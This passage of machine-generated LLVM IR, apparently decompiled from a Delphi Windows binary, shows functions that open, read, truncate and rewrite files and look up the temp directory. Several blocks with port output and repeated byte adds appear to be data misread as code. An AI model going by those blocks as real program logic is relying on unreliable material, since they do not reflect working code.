  store i8 %41, i8* %37, align 1, !insn.addr !1664
  %42 = mul i32 %arg5, 2, !insn.addr !1665
  %43 = add i32 %arg2, 115, !insn.addr !1665
  %44 = add i32 %43, %42, !insn.addr !1665
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1665
  %46 = load i8, i8* %45, align 1, !insn.addr !1665
  %47 = trunc i32 %arg2 to i8, !insn.addr !1665
  %48 = add i8 %46, %47, !insn.addr !1665
  %49 = icmp eq i8 %48, 0, !insn.addr !1665
  store i8 %48, i8* %45, align 1, !insn.addr !1665
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1666
  br i1 %49, label %dec_label_pc_406e23, label %dec_label_pc_406de1, !insn.addr !1666

dec_label_pc_406de1:                              ; preds = %dec_label_pc_406dd2
  %50 = icmp slt i8 %48, 0, !insn.addr !1665
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1667
  %52 = load i32, i32* %51, align 4, !insn.addr !1667
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1667
  br i1 %50, label %dec_label_pc_406e58, label %dec_label_pc_406de6, !insn.addr !1668

dec_label_pc_406de6:                              ; preds = %dec_label_pc_406de1
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1669
  %55 = add i8 %54, -32, !insn.addr !1669
  %56 = icmp ult i8 %54, 32, !insn.addr !1669
  %57 = icmp eq i8 %55, 0, !insn.addr !1669
  %58 = zext i8 %55 to i32, !insn.addr !1669
  %59 = and i32 %53, -256, !insn.addr !1669
  %60 = or i32 %59, %58, !insn.addr !1669
  store i32 %60, i32* %eax, align 4, !insn.addr !1669
  %61 = or i1 %56, %57, !insn.addr !1670
  br i1 %61, label %dec_label_pc_406dea, label %dec_label_pc_406e59, !insn.addr !1670

dec_label_pc_406dea:                              ; preds = %dec_label_pc_406de6
  %62 = add i32 %arg2, 105, !insn.addr !1671
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1671
  %64 = load i8, i8* %63, align 1, !insn.addr !1671
  %65 = udiv i32 %53, 256, !insn.addr !1671
  %66 = trunc i32 %65 to i8, !insn.addr !1671
  %67 = and i8 %64, %66, !insn.addr !1671
  store i8 %67, i8* %63, align 1, !insn.addr !1671
  %68 = add i32 %arg6, 105, !insn.addr !1672
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1672
  %70 = load i8, i8* %69, align 1, !insn.addr !1672
  %71 = and i8 %70, %40, !insn.addr !1672
  store i8 %71, i8* %69, align 1, !insn.addr !1672
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1673
  %74 = load i8, i8* %73, align 1, !insn.addr !1673
  %75 = trunc i32 %72 to i8, !insn.addr !1673
  %76 = add i8 %74, %75, !insn.addr !1673
  store i8 %76, i8* %73, align 1, !insn.addr !1673
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1674
  %79 = load i8, i8* %78, align 1, !insn.addr !1674
  %80 = trunc i32 %77 to i8, !insn.addr !1674
  %81 = add i8 %79, %80, !insn.addr !1674
  store i8 %81, i8* %78, align 1, !insn.addr !1674
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1675
  %83 = load i32, i32* %82, align 4, !insn.addr !1675
  %84 = add i32 %83, %arg6, !insn.addr !1675
  store i32 %84, i32* %82, align 4, !insn.addr !1675
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1676
  %87 = load i8, i8* %86, align 1, !insn.addr !1676
  %88 = trunc i32 %85 to i8, !insn.addr !1676
  %89 = add i8 %87, %88, !insn.addr !1676
  store i8 %89, i8* %86, align 1, !insn.addr !1676
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1677
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1678
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1678
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1678
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1679
  %92 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1680
  %93 = add i32 %92, 1, !insn.addr !1680
  %94 = icmp eq i32 %93, 0, !insn.addr !1680
  store i32 %93, i32* @global_var_4096e0, align 4, !insn.addr !1680
  %95 = icmp eq i1 %94, false, !insn.addr !1681
  br i1 %95, label %dec_label_pc_406e1b, label %dec_label_pc_406e11, !insn.addr !1681

dec_label_pc_406e11:                              ; preds = %dec_label_pc_406dea
  %96 = call i32 @"@LStrClr"(), !insn.addr !1682
  br label %dec_label_pc_406e1b, !insn.addr !1682

dec_label_pc_406e1b:                              ; preds = %dec_label_pc_406e11, %dec_label_pc_406dea
  store i32 0, i32* %eax, align 4, !insn.addr !1683
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1684
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1685
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1685
  br label %dec_label_pc_406e23, !insn.addr !1685

dec_label_pc_406e23:                              ; preds = %dec_label_pc_406e1b, %dec_label_pc_406dd2
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1686
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1686
  store i32 4222512, i32* %99, align 4, !insn.addr !1686
  %100 = load i32, i32* %eax, align 4, !insn.addr !1687
  ret i32 %100, !insn.addr !1687

dec_label_pc_406e41:                              ; preds = %dec_label_pc_406dc9
  %101 = mul i32 %4, 2, !insn.addr !1688
  %102 = add i32 %1, 105, !insn.addr !1688
  %103 = add i32 %102, %101, !insn.addr !1688
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1688
  %105 = load i32, i32* %104, align 4, !insn.addr !1688
  %106 = or i32 %105, %3, !insn.addr !1688
  store i32 %106, i32* %104, align 4, !insn.addr !1688
  %107 = add i32 %0, -1, !insn.addr !1689
  %108 = trunc i32 %3 to i16, !insn.addr !1690
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1690
  %110 = load i32, i32* %109, align 4, !insn.addr !1690
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1690
  %111 = load i32, i32* %eax, align 4, !insn.addr !1691
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1691
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1691
  %115 = or i8 %112, %114, !insn.addr !1691
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1691
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1692
  %118 = load i8, i8* %117, align 1, !insn.addr !1692
  %119 = trunc i32 %116 to i8, !insn.addr !1692
  %120 = add i8 %118, %119, !insn.addr !1692
  store i8 %120, i8* %117, align 1, !insn.addr !1692
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1693
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1693
  %124 = load i8, i8* %123, align 1, !insn.addr !1693
  %125 = add i8 %124, %122, !insn.addr !1693
  %126 = zext i8 %125 to i32, !insn.addr !1693
  %127 = and i32 %121, -256, !insn.addr !1693
  %128 = or i32 %127, %126, !insn.addr !1693
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1694
  %130 = load i8, i8* %129, align 1, !insn.addr !1694
  %131 = trunc i32 %3 to i8, !insn.addr !1695
  %132 = add i8 %125, %131, !insn.addr !1694
  %133 = add i8 %132, %130, !insn.addr !1695
  store i8 %133, i8* %129, align 1, !insn.addr !1695
  %134 = add i32 %128, 1, !insn.addr !1696
  store i32 %134, i32* %eax, align 4, !insn.addr !1696
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1697
  %136 = load i8, i8* %135, align 1, !insn.addr !1697
  %137 = trunc i32 %134 to i8, !insn.addr !1697
  %138 = add i8 %136, %137, !insn.addr !1697
  store i8 %138, i8* %135, align 1, !insn.addr !1697
  br label %dec_label_pc_406e58, !insn.addr !1697

dec_label_pc_406e58:                              ; preds = %dec_label_pc_406e41, %dec_label_pc_406de1
  %139 = load i32, i32* %eax, align 4, !insn.addr !1697
  ret i32 %139, !insn.addr !1697

dec_label_pc_406e59:                              ; preds = %dec_label_pc_406de6
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1698
  %141 = load i8, i8* %140, align 1, !insn.addr !1698
  %142 = add i8 %141, %55, !insn.addr !1698
  store i8 %142, i8* %140, align 1, !insn.addr !1698
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1699
  %145 = load i8, i8* %144, align 1, !insn.addr !1699
  %146 = trunc i32 %arg3 to i8, !insn.addr !1699
  %147 = add i8 %145, %146, !insn.addr !1699
  store i8 %147, i8* %144, align 1, !insn.addr !1699
  %148 = load i32, i32* %eax, align 4, !insn.addr !1700
  %149 = add i32 %148, 1, !insn.addr !1700
  %150 = mul i32 %149, 2, !insn.addr !1701
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1701
  %152 = load i8, i8* %151, align 2, !insn.addr !1701
  %153 = trunc i32 %149 to i8, !insn.addr !1701
  %154 = add i8 %152, %153, !insn.addr !1701
  store i8 %154, i8* %151, align 2, !insn.addr !1701
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1702
  %156 = load i8, i8* %155, align 1, !insn.addr !1702
  %157 = add i8 %156, %153, !insn.addr !1702
  store i8 %157, i8* %155, align 1, !insn.addr !1702
  ret i32 %149, !insn.addr !1703
}

define i32 @function_406e84() local_unnamed_addr {
dec_label_pc_406e84:
  %esp.1.reg2mem = alloca i32, !insn.addr !1704
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1705
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1705
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1705
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1706
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1707
  %3 = call i32 @function_4036f4(), !insn.addr !1708
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1709
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1709
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1709
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1710
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1711
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1712
  br i1 %7, label %dec_label_pc_407023, label %dec_label_pc_406eee, !insn.addr !1712

dec_label_pc_406eee:                              ; preds = %dec_label_pc_406e84
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1710
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1713
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1713
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1714
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1715
  br i1 %12, label %dec_label_pc_407023, label %dec_label_pc_406f0a, !insn.addr !1715

dec_label_pc_406f0a:                              ; preds = %dec_label_pc_406eee
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1716
  %14 = call i32 @function_40374c(), !insn.addr !1717
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1718
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1718
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1719
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1719
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1720
  %19 = call i32 @function_404700(), !insn.addr !1721
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_407023

dec_label_pc_407023:                              ; preds = %dec_label_pc_406f0a, %dec_label_pc_406eee, %dec_label_pc_406e84
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1722
  %21 = load i32, i32* %20, align 4, !insn.addr !1722
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1723
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1724
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1724
  store i32 4223045, i32* %23, align 4, !insn.addr !1724
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1725
  ret i32 %24, !insn.addr !1726
}

define i32 @function_40703e() local_unnamed_addr {
dec_label_pc_40703e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1727
  ret i32 %0, !insn.addr !1727
}

define i32 @function_407043() local_unnamed_addr {
dec_label_pc_407043:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1728
}

define i32 @function_407045(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407045:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1729
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1729
  %3 = load i32, i32* %2, align 4, !insn.addr !1729
  ret i32 %3, !insn.addr !1730
}

define i32 @function_40707c() local_unnamed_addr {
dec_label_pc_40707c:
  %esp.2.reg2mem = alloca i32, !insn.addr !1731
  %esp.1.reg2mem = alloca i32, !insn.addr !1731
  %esi.0.reg2mem = alloca i32, !insn.addr !1731
  %esp.0.reg2mem = alloca i32, !insn.addr !1731
  %ebx.0.reg2mem = alloca i32, !insn.addr !1731
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1732
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1733
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1733
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1733
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1734
  %2 = call i32 @function_403cb4(), !insn.addr !1735
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1736
  br i1 %3, label %dec_label_pc_407165, label %dec_label_pc_4070aa, !insn.addr !1736

dec_label_pc_4070aa:                              ; preds = %dec_label_pc_40707c
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1737
  %5 = call i32 @function_4036f4(), !insn.addr !1738
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1739
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1739
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1739
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1740
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1741
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1742
  br i1 %9, label %dec_label_pc_407165, label %dec_label_pc_4070e6, !insn.addr !1742

dec_label_pc_4070e6:                              ; preds = %dec_label_pc_4070aa
  %10 = call i32 @"@LStrClr"(), !insn.addr !1743
  %11 = call i32 @function_403cbc(), !insn.addr !1744
  %12 = icmp slt i32 %11, 0, !insn.addr !1745
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1746
  br i1 %12, label %dec_label_pc_407130, label %dec_label_pc_4070fe, !insn.addr !1746

dec_label_pc_4070fe:                              ; preds = %dec_label_pc_4070e6
  %13 = add i32 %11, 1, !insn.addr !1747
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1748
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1748
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1748
  br label %dec_label_pc_407101, !insn.addr !1748

dec_label_pc_407101:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070fe
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1749
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1749
  store i32 0, i32* %15, align 4, !insn.addr !1749
  %16 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1750
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1751
  %18 = add i32 %16, %17, !insn.addr !1751
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1751
  %20 = load i32, i32* %19, align 4, !insn.addr !1751
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1751
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1751
  store i32 %20, i32* %22, align 4, !insn.addr !1751
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1752
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1752
  store i32 ptrtoint (i32* @global_var_4071ac to i32), i32* %24, align 4, !insn.addr !1752
  %25 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1753
  %26 = or i32 %17, 4, !insn.addr !1754
  %27 = add i32 %25, %26, !insn.addr !1754
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1754
  %29 = load i32, i32* %28, align 4, !insn.addr !1754
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1754
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1754
  store i32 %29, i32* %31, align 4, !insn.addr !1754
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1755
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1755
  store i32 ptrtoint ([3 x i8]* @global_var_4071b8 to i32), i32* %33, align 4, !insn.addr !1755
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1756
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1757
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1758
  %37 = icmp eq i32 %36, 0, !insn.addr !1758
  %38 = icmp eq i1 %37, false, !insn.addr !1759
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1759
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1759
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1759
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1759
  br i1 %38, label %dec_label_pc_407101, label %dec_label_pc_407130, !insn.addr !1759

dec_label_pc_407130:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070e6
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1740
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_404700(), !insn.addr !1760
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1761
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1761
  store i32 0, i32* %42, align 4, !insn.addr !1761
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1762
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1762
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1762
  store i32 %45, i32* %44, align 4, !insn.addr !1762
  %46 = call i32 @function_4034f4(), !insn.addr !1763
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1764
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1764
  store i32 %46, i32* %48, align 4, !insn.addr !1764
  %49 = call i32 @function_40374c(), !insn.addr !1765
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1766
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1766
  store i32 %49, i32* %51, align 4, !insn.addr !1766
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1767
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1767
  store i32 %39, i32* %53, align 4, !insn.addr !1767
  %54 = call i32 @function_404498(), !insn.addr !1768
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1769
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1769
  store i32 %39, i32* %56, align 4, !insn.addr !1769
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1770
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1771
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1771
  store i32 %39, i32* %59, align 4, !insn.addr !1771
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1772
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1773
  br label %dec_label_pc_407165, !insn.addr !1773

dec_label_pc_407165:                              ; preds = %dec_label_pc_407130, %dec_label_pc_4070aa, %dec_label_pc_40707c
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1774
  %62 = load i32, i32* %61, align 4, !insn.addr !1774
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1775
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1776
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1776
  store i32 4223367, i32* %64, align 4, !insn.addr !1776
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1777
  ret i32 %65, !insn.addr !1778
}

define i32 @function_407180() local_unnamed_addr {
dec_label_pc_407180:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1779
  ret i32 %0, !insn.addr !1779
}

define i32 @function_407185() local_unnamed_addr {
dec_label_pc_407185:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1780
}

define i32 @function_407187(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407187:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1781
}

define i32 @function_4071bc() local_unnamed_addr {
dec_label_pc_4071bc:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036e4(), !insn.addr !1782
  %1 = call i32 @function_4036e4(), !insn.addr !1783
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1784
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1784
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1784
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1785
  %4 = call i32 @function_403cbc(), !insn.addr !1786
  %5 = icmp slt i32 %4, 0, !insn.addr !1787
  br i1 %5, label %dec_label_pc_407244, label %dec_label_pc_407212, !insn.addr !1788

dec_label_pc_407212:                              ; preds = %dec_label_pc_4071bc
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1789
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1790
  br label %dec_label_pc_407290

dec_label_pc_407244:                              ; preds = %dec_label_pc_4071bc
  %8 = call i32 @function_403cb4(), !insn.addr !1791
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1792
  %10 = call i32 @function_403cbc(), !insn.addr !1793
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1794
  %12 = call i32 @function_403cbc(), !insn.addr !1795
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1796
  %14 = call i32 @function_40707c(), !insn.addr !1797
  br label %dec_label_pc_407290, !insn.addr !1797

dec_label_pc_407290:                              ; preds = %dec_label_pc_407212, %dec_label_pc_407244
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1798
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1799
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1800
  ret i32 %16, !insn.addr !1801
}

define i32 @function_4072ab() local_unnamed_addr {
dec_label_pc_4072ab:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1802
  ret i32 %0, !insn.addr !1802
}

define i32 @function_4072b0() local_unnamed_addr {
dec_label_pc_4072b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1803
}

define i32 @function_4072b2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1804
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1804
  %3 = load i32, i32* %2, align 4, !insn.addr !1804
  ret i32 %3, !insn.addr !1805
}

define i32 @function_4072bc() local_unnamed_addr {
dec_label_pc_4072bc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1806
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1806
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1806
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1807
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1808
  %3 = add i32 %2, 1, !insn.addr !1808
  %4 = icmp eq i32 %3, 0, !insn.addr !1808
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1808
  %5 = icmp eq i1 %4, false, !insn.addr !1809
  br i1 %5, label %dec_label_pc_4072f4, label %dec_label_pc_4072d5, !insn.addr !1809

dec_label_pc_4072d5:                              ; preds = %dec_label_pc_4072bc
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1810
  %7 = icmp eq i32 %6, 0, !insn.addr !1810
  br i1 %7, label %dec_label_pc_4072e4, label %dec_label_pc_4072df, !insn.addr !1811

dec_label_pc_4072df:                              ; preds = %dec_label_pc_4072d5
  %8 = call i32 @function_40707c(), !insn.addr !1812
  br label %dec_label_pc_4072e4, !insn.addr !1812

dec_label_pc_4072e4:                              ; preds = %dec_label_pc_4072df, %dec_label_pc_4072d5
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1813
  br label %dec_label_pc_4072f4, !insn.addr !1813

dec_label_pc_4072f4:                              ; preds = %dec_label_pc_4072e4, %dec_label_pc_4072bc
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1814
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1815
  ret i32 0, !insn.addr !1816
}

define i32 @function_407302() local_unnamed_addr {
dec_label_pc_407302:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1817
  ret i32 %0, !insn.addr !1817
}

define i32 @function_407307() local_unnamed_addr {
dec_label_pc_407307:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1818
}

define i32 @function_407309(i32 %arg1) local_unnamed_addr {
dec_label_pc_407309:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1819
}

define i32 @function_40730c() local_unnamed_addr {
dec_label_pc_40730c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1820
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1820
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1820
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1821
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1822
  %3 = add i32 %2, -1, !insn.addr !1822
  %4 = icmp eq i32 %2, 0, !insn.addr !1822
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1822
  %5 = icmp eq i1 %4, false, !insn.addr !1823
  br i1 %5, label %dec_label_pc_407340, label %dec_label_pc_407326, !insn.addr !1823

dec_label_pc_407326:                              ; preds = %dec_label_pc_40730c
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1824
  br label %dec_label_pc_407340, !insn.addr !1825

dec_label_pc_407340:                              ; preds = %dec_label_pc_407326, %dec_label_pc_40730c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1826
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1827
  ret i32 0, !insn.addr !1828
}

define i32 @function_40734e() local_unnamed_addr {
dec_label_pc_40734e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1829
  ret i32 %0, !insn.addr !1829
}

define i32 @function_407353() local_unnamed_addr {
dec_label_pc_407353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1830
}

define i32 @function_407355(i32 %arg1) local_unnamed_addr {
dec_label_pc_407355:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1831
}

define i1 @function_407358(i8* %pszPath) local_unnamed_addr {
dec_label_pc_407358:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1832
  ret i1 %0, !insn.addr !1832
}

define i32 @function_407360() local_unnamed_addr {
dec_label_pc_407360:
  %eax.0.reg2mem = alloca i32, !insn.addr !1833
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1834
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1835
  %2 = icmp eq i32 %1, 0, !insn.addr !1836
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1837
  br i1 %2, label %dec_label_pc_407396, label %dec_label_pc_407378, !insn.addr !1837

dec_label_pc_407378:                              ; preds = %dec_label_pc_407360
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1834
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1838
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1838
